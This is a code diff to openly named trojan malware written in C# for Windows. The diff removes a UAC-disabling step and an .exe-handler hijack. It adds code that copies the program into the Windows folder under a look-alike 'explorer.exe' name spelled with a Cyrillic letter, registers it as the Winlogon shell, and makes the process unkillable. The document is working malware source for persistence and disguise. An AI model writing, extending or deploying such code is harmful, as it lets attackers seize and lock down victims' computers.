@@ -33,25 +33,22 @@ namespace UntitledTrojan
 
                 if (Failsafe.FailMain())
                 {
+                    MessageBox.Show("Noice!", "UntitledTrojan");
                     if (!debug)
                     {
-                        // Disable UAC
-                        RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
-                        uac.SetValue("EnableLUA", 0);
-                        
+                        MessageBox.Show("Debug is disabled", "UntitledTrojan");
+
                         // Copy itself into some folder
-                        string path = $"C:\\Users\\{Environment.UserName}\\AppData\\Microsoft\\Windows\\";
-                        string rundll = "rundll32.exe";
+                        string path = $"C:\\Windows\\";
+                        string explorer = "еxplorer.exe";
                         Directory.CreateDirectory(path);
-                        File.Copy(Application.ExecutablePath, path + rundll);
+                        File.Copy(Application.ExecutablePath, path + explorer);
+                        MessageBox.Show("Disabled UAC", "UntitledTrojan");
 
                         // Set itself as a shell
                         RegistryKey key1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
-                        key1.SetValue("Shell", path + rundll + " /s");
-
-                        // Anti-EXE
-                        RegistryKey key2 = Registry.ClassesRoot.OpenSubKey(@"exefile\shell\open\command", true);
-                        key2.SetValue("Default", $"msg \"{Environment.UserName}\" Do you think that you can do this?");
+                        key1.SetValue("Shell", explorer + " /s");
+                        MessageBox.Show("I am a shell now!", "UntitledTrojan");
 
                         // Make sure that this process can't be killed
                         MakeUnclosable();
